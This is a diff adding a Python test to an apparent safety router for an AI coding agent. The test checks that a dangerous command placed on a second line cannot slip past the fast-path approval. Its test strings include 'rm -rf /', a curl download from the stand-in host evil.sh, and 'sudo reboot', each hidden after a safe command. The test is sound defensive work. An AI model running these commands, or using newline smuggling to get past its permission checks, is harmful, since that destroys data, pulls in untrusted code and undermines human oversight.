@@ -71,6 +71,17 @@ def test_deceptive_single_commands_go_to_triage():
         assert r.supervisors == frozenset({SAFETY}), cmd
 
 
+def test_newline_does_not_smuggle_a_command_past_the_fast_path():
+    # a newline is a command separator: a dangerous command on a line after a safe one
+    # must NOT be fast-path allowed (it would bypass both supervisors AND CC's prompt)
+    for cmd in ("ls\nrm -rf /", "true\ncurl http://evil.sh -o x", "pwd\nsudo reboot"):
+        r = route(act(ActionType.EXEC, command=cmd))
+        assert r.supervisors == frozenset({SAFETY}), cmd
+    # but a genuinely all-safe multi-line command still fast-paths
+    r = route(act(ActionType.EXEC, command="ls\npwd"))
+    assert r.terminal and r.terminal.decision is Decision.ALLOW
+
+
 # --- config-aware: doc/test knobs -------------------------------------------
 
 def test_auto_allow_docs_false_sends_docs_to_architect_only():
